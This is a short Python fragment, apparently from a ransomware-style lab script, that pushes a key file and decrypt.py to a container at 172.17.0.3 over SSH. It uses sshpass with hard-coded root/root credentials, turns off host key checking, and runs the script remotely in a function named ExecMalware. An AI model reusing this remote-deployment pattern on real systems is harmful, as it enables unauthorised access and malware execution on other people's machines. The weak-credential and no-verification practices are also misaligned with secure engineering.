ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no chkey.txt "+ "root"+"@172.17.0.3:/root/../"
os.system(ostring)

ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no decrypt.py "+ "root"+"@172.17.0.3:/root"

def ExecMalware():

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect('172.17.0.3', username="root", password="root")

    time.sleep(1)
    stdin, stdout, stderr = client.exec_command('cd ../ && python3 decrypt.py')


    for line in stdout:
        print(line)

    client.close()
